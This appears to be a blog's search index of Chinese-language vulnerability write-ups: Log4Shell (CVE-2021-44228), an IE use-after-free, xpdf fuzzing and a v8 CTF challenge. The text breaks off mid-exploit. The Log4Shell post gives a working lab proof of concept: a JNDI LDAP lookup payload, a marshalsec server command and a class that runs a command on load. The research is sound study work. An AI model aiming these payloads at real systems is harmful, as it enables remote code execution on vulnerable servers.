<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2021-44228漏洞分析</title>
    <link href="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>idea创建maven项目,引入对应log4j版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>          &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;<br>          &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;<br>          &lt;version&gt;<span class="hljs-number">2.14</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>payload编译为.class文件,静态代码块会在类被加载时执行.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hacked&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本地开启LDAP服务,监听8888端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer<br>&quot;http://127.0.0.1:7777/#Exploit&quot; 8888<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LogTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        logger.error(<span class="hljs-string">&quot;$&#123;jndi:ldap://localhost:8888/Exploit&#125;&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>对exploit进行调试</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216165826891.png" alt="image-20211216165826891"></p><p>向下追踪会通过isEnabled函数进行判断level是否&lt;&#x3D;200</p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170341524.png" alt="image-20211216170341524"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170424710.png" alt="image-20211216170424710"></p><p>StandardLevel枚举类,可知level为:OFF,FATAL,ERROR时,都是可以触发漏洞的</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211216170558367.png" alt="image-20211216170558367"></p><p>获取指定事件的文本形式,并写入StringBuilder</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221161503823.png" alt="image-20211221161503823"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221161416367.png" alt="image-20211221161416367"></p><p>通过PatternFormatter类成员方法format将event对象反序列化为字符串</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221162014132.png" alt="image-20211221162014132"></p><p>此处对配置进行了一些判断,如果存在配置文件,通过配置工具类PropertiesUtils从配置文件中获取”log4j2.formatMsgNoLookups”值,如果不存在配置文件或者未进行配置,此值默认为false.<br>为false时,会继续向下执行,如果存在”$” “{“字符则获取${}中内容</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165353545.png" alt="image-20211221165353545"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165339040.png" alt="image-20211221165339040"></p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221165238753.png" alt="image-20211221165238753"></p><p>然后对日志事件进行处理</p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221170535979.png" alt="image-20211221170535979"></p><p>通过lookup函数,在strLookupMap中将prefix “jndi” 作为key获取该event的对应StrLookup接口类实例,通过lookup函数查找资源exploit并进行加载,实现RCE</p><p><img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221171516170.png" alt="image-20211221171516170"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221171830245.png" alt="image-20211221171830245"></p><p> <img src="/2022/12/27/CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211221173112388-164087746810815.png" alt="image-20211221173112388"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2013-1347 漏洞分析与利用</title>
    <link href="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>这块内存已被释放</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102112450910.png" alt="image-20220102112450910"></p><p>通过调用CSpanElement::CreateElement函数创建span元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102113558401.png" alt="image-20220102113558401"></p><p>函数内部通过HeapAlloc申请长度为0x28大小内存空间</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102114100898.png" alt="image-20220102114100898"></p><p>查找插入位置,这里查找到了body元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102141539670.png" alt="image-20220102141539670"></p><p>CTreeNode元素</p><p><img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220102150101085.png" alt="image-20220102150101085"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143414127.png" alt="image-20220103143414127"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103144243241.png" alt="image-20220103144243241"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143548884.png" alt="image-20220103143548884"></p><p>下面开始分析CElement,CTreeNode的释放情况.</p><p>当去掉f0.offsetParent&#x3D;null,两者都会被释放.</p><p>当加上f0.offsetParent&#x3D;null,CTreeNode不会被释放,CElement会被释放,同时CTreeNode对象依然保存着CElement对象的地址,导致后面CollectGarbage调用时引用到了这个地址的函数,造成了漏洞的发生.所以问题的关键就在于为什么CTreeNode元素没有被释放.</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151706142.png" alt="image-20220105151706142"></p><p>TreeNode</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151638784.png" alt="image-20220105151638784"></p><p>CElement</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220105151700542.png" alt="image-20220105151700542"></p><p>对比一下f0.offsetParent&#x3D;null去除与未去除状态下的堆栈情况</p><p>为了明白CTreeNode没有被释放的原因,要弄清楚f0.offsetParent&#x3D;null在内存中做了什么,通过搜索offsetParent,可以找到对应函数CElement::GetOffsetParentHelper,对GetOffsetParentHelper执行前后的CTreeNode进行一个对比,看看修改了哪些值.</p><p>+8,+C位置发送了变化.</p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103143414127.png" alt="image-20220103143414127"></p><p> <img src="/2022/12/27/CVE-2013-1347%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20220103144234127.png" alt="image-20220103144234127"></p><p>对比着IE5的源码看一下这两个值.</p><p>+4+8位置是CElement对象地址和父节点CTreeNode对象地址,后面4个字节是一些标志位,+C位置是定义CharFormat的值,这个值的作用暂时不知道,对这个值下读断点调一下.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// Class Data</span><br>   CElement*   _pElement;                          <span class="hljs-comment">// The element for this node</span><br>   CTreeNode*  _pNodeParent;                       <span class="hljs-comment">// The parent in the CTreeNode tree</span><br><br>   <span class="hljs-comment">// DWORD 1</span><br>   BYTE        _etag;                              <span class="hljs-comment">// 0-7:     element tag</span><br>   BYTE        _fFirstCommonAncestorNode   : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 8:       for finding common ancestor</span><br>   BYTE        _fInMarkup                  : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 9:       this node is in a markup and shouldn&#x27;t die</span><br>   BYTE        _fInMarkupDestruction       : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 10:      Used by CMarkup::DestroySplayTree</span><br>   BYTE        _fHasLookasidePtr           : <span class="hljs-number">2</span>;    <span class="hljs-comment">// 11-12    Lookaside flags</span><br>   BYTE        _fBlockNess                 : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 13:      Cached from format -- valid if _iFF != -1</span><br>   BYTE        _fHasLayout                 : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 14:      Cached from format -- valid if _iFF != -1</span><br>   BYTE        _fUnused                    : <span class="hljs-number">1</span>;    <span class="hljs-comment">// 15:      Unused</span><br><br>   SHORT       _iPF;                               <span class="hljs-comment">// 16-31:   Paragraph Format</span><br><br>   <span class="hljs-comment">// DWORD 2</span><br>   SHORT       _iCF;                               <span class="hljs-comment">// 0-15:    Char Format</span><br>   SHORT       _iFF;                               <span class="hljs-comment">// 16-31:   Fancy Format</span><br></code></pre></td></tr></table></figure><p>sxe ld:mshtml</p><p>bp mshtml+17d715 “ln eax;g”</p><p>bp mshtml!CElement::CElement+0x1e “.echo ‘&#x3D;&#x3D;&#x3D;CElement&#x3D;&#x3D;&#x3D;’;dd esi l(28&#x2F;4);g “</p><p>bp mshtml+fb0af “.echo ‘&#x3D;&#x3D;&#x3D;CTreeNode&#x3D;&#x3D;&#x3D;’;dd eax l13;g”</p><p>bp mshtml!CElement::GetOffsetParentHelper</p><p>bu jscript!JsAtan2 “.printf &quot;%mu&quot;,poi(poi(poi(esp+14)+8)+8);.echo;”</p><p>bp mshtml!+92ab8</p><p>bp mshtml+8bed9 “.echo ‘&#x3D;&#x3D;&#x3D;eax+4&#x3D;&#x3D;&#x3D;’;dd eax+4;g”</p><p>ba w4 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing101_01</title>
    <link href="/2022/12/27/Fuzzing101__01/"/>
    <url>/2022/12/27/Fuzzing101__01/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing101-01"><a href="#Fuzzing101-01" class="headerlink" title="Fuzzing101__01"></a>Fuzzing101__01</h1><p>CVE-2019-13228漏洞,xpdf-3.02 parse.cc文件getObj函数的无限递归漏洞,可用于DDos攻击 <img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%872.png"> </p><p>使用afl++进行fuzz 编译 Export LLVM_CONFIG&#x3D;”llvm-config-11” CC&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast CXX&#x3D;$HOME&#x2F;AFLplusplus&#x2F;afl-clang-fast Make&amp;&amp;Make install </p><p>随便下载几个pdf作为种子 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%871.png"> </p><p>开始fuzz </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%873.png"></p><p> Fuzz结果 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%874.png"> </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%875.png"> </p><p>运行结果 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%876.png"> </p><p>使用gdb进行调试 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%877.png"> </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%878.png"> </p><p>bt查看堆栈,很明显大量调用Parse::getObj造成无限递归 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%879.png"> </p><p>该漏洞在xpdf 4.02版本被修复,下载4.02版本,对比parse.cc文件,可以很明显的看出getObj函数增加了两个参数simpleOnly和recurion作为判断,防止了无限递归调用 </p><p><img src="/2022/12/27/Fuzzing101__01/%E5%9B%BE%E7%89%8710.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>v8漏洞练习笔记_starctf2019 oob</title>
    <link href="/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/"/>
    <url>/2022/12/27/v8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0_starctf2019%20oob/</url>
    
    <content type="html"><![CDATA[<h1 id="v8漏洞练习笔记-starctf2019-oob"><a href="#v8漏洞练习笔记-starctf2019-oob" class="headerlink" title="v8漏洞练习笔记_starctf2019 oob"></a>v8漏洞练习笔记_starctf2019 oob</h1><h5 id="v8内存结构"><a href="#v8内存结构" class="headerlink" title="v8内存结构"></a>v8内存结构</h5><p>v8变量内存结构,新版v8使用了指针压缩,基址存于R13寄存器,指针通过32为存储,最后一位表示tag,为1时会与R13中的基址进行运算 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">DebugPrint: 0x101f080c5e09: [JSArray]<br><br>- map: 0x101f08281891 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br>- prototype: 0x101f08248f7d &lt;JSArray[0]&gt;<br><br>- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br>- length: 4<br><br>- properties: 0x101f080406e9 &lt;FixedArray[0]&gt; &#123;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">length: 0x101f081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br>  &#125;<br><br>- elements: 0x101f080c5de1 &lt;FixedDoubleArray[4]&gt; &#123;<br><br>   0: 2.1<br><br>   1: 3.2<br><br>   2: 0.1<br><br>   3: 1<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>其中elements是实际存储数据的对象元素,所以实际上是v8对变量做了2层封装,data-&gt;elements-&gt;JSArrayObject,通过map结构存储. </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/10gx <span class="hljs-number">0x101f080c5e08</span><br><br><span class="hljs-number">0x101f080c5e08</span>:  <span class="hljs-number">0x080406e908281891</span>  <span class="hljs-number">0x00000008080c5de1</span><br><br><span class="hljs-number">0x101f080c5e18</span>:  <span class="hljs-number">0x080406e908284e79</span>  <span class="hljs-number">0x00000002080406e9</span><br><br><span class="hljs-number">0x101f080c5e28</span>:  <span class="hljs-number">0x00010001080401c5</span>  <span class="hljs-number">0x0804116d00000000</span><br><br><span class="hljs-number">0x101f080c5e38</span>:  <span class="hljs-number">0x000000880808a5e5</span>  <span class="hljs-number">0x080404b100000002</span><br><br><span class="hljs-number">0x101f080c5e48</span>:  <span class="hljs-number">0x080c5e1900000002</span>  <span class="hljs-number">0x080406e9082818e1</span><br><br> <br><br>pwndbg&gt; job <span class="hljs-number">0x101f080c5de1</span><br><br><span class="hljs-number">0x101f080c5de1</span>: [FixedDoubleArray]<br><br> - map: <span class="hljs-number">0x101f08040a3d</span> &lt;Map&gt;<br><br> - length: <span class="hljs-number">4</span><br><br>​      <span class="hljs-number">0</span>: <span class="hljs-number">2.1</span><br><br>​      <span class="hljs-number">1</span>: <span class="hljs-number">3.2</span><br><br>​      <span class="hljs-number">2</span>: <span class="hljs-number">0.1</span><br><br>​      <span class="hljs-number">3</span>: <span class="hljs-number">1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol"> </span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">elements:</span><br><br>map,length,value<br><br>pwndbg&gt; x/8x <span class="hljs-number">0x101f080c5de0</span><br><br><span class="hljs-number">0x101f080c5de0</span>:  <span class="hljs-number">0x0000000808040a3d</span>  <span class="hljs-number">0x4000cccccccccccd</span><br><br><span class="hljs-number">0x101f080c5df0</span>:  <span class="hljs-number">0x400999999999999a</span>  <span class="hljs-number">0x3fb999999999999a</span><br><br><span class="hljs-number">0x101f080c5e00</span>:  <span class="hljs-number">0x3ff0000000000000</span>  <span class="hljs-number">0x080406e908281891</span><br><br><span class="hljs-number">0x101f080c5e10</span>:  <span class="hljs-number">0x00000008080c5de1</span>  <span class="hljs-number">0x080406e908284e79</span><br></code></pre></td></tr></table></figure><p>两个结构的length均做了*2处理.</p><p>其中描述了这个变量的属性信息,包括类型,长度,element等 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">0x101f08281891: [Map]<br><br> - type: JS_ARRAY_TYPE<br><br> - instance size: 16<br><br> - inobject properties: 0<br><br> - elements kind: PACKED_DOUBLE_ELEMENTS<br><br> - unused property fields: 0<br><br> - enum length: invalid<br><br> - back pointer: 0x101f08281869 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;<br><br> - prototype_validity cell: 0x101f081c0451 &lt;Cell value= 1&gt;<br><br> - instance descriptors #1: 0x101f08249605 &lt;DescriptorArray[1]&gt;<br><br> - transitions #1: 0x101f08249651 &lt;TransitionArray[4]&gt;Transition array #1:<br><br>   0x101f08042eb9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x101f082818b9 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;<br><br> <br> - prototype: 0x101f08248f7d &lt;JSArray[0]&gt;<br><br> - constructor: 0x101f08248e51 &lt;JSFunction Array (sfi = 0x101f081cbf85)&gt;<br><br> - dependent code: 0x101f080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br><br> - construction counter: 0<br></code></pre></td></tr></table></figure><p>实际内存结构 { map:32bit properties:32bit elements } elements结构 { map, } 变量在内存中的结构是一致的,并且大小为64bit,指针类型变量被压缩,占32bit. </p><h5 id="starctf-2019-oob"><a href="#starctf-2019-oob" class="headerlink" title="starctf 2019 oob"></a>starctf 2019 oob</h5><p>diff片段,增加了一个oob函数,函数逻辑为当参数为1,也就是不传参,只有一个this参数时,会读取数组length索引的值,不为1,则会将传参数据写入length索引处,两种方式都会造成数组访问越界. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,<br><br>​              Builtins::kArrayPrototypeCopyWithin, 2, false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,<br><br>​              Builtins::kArrayPrototypeFill, 1, false);<br><br>+  SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,<br><br>+             Builtins::kArrayOob,2,false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;find&quot;,<br><br>​              Builtins::kArrayPrototypeFind, 1, false);<br><br>   SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,<br><br>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc<br><br>index 8df340e..9b828ab 100644<br><br>--- a/src/builtins/builtins-array.cc<br><br>+++ b/src/builtins/builtins-array.cc<br><br>@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,<br><br>  return *final_length;<br><br> &#125;<br><br> &#125; // namespace<br><br>+BUILTIN(ArrayOob)&#123;<br><br>+  uint32_t len = args.length();<br><br>+  if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();<br><br>+  Handle&lt;JSReceiver&gt; receiver;<br><br>+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<br><br>+      isolate, receiver, Object::ToObject(isolate, args.receiver()));<br><br>+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);<br><br>+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());<br><br>+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());<br><br>+  if(len == 1)&#123;<br><br>+    //read<br><br>+    return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));<br><br>+  &#125;else&#123;<br><br>+    //write<br><br>+    Handle&lt;Object&gt; value;<br><br>+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(<br><br>+        isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));<br><br>+    elements.set(length,value-&gt;Number());<br><br>+    return ReadOnlyRoots(isolate).undefined_value();<br><br>+  &#125;<br><br>+&#125;<br></code></pre></td></tr></table></figure><p>构造这样一个JS文件,对oob进行测试. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title 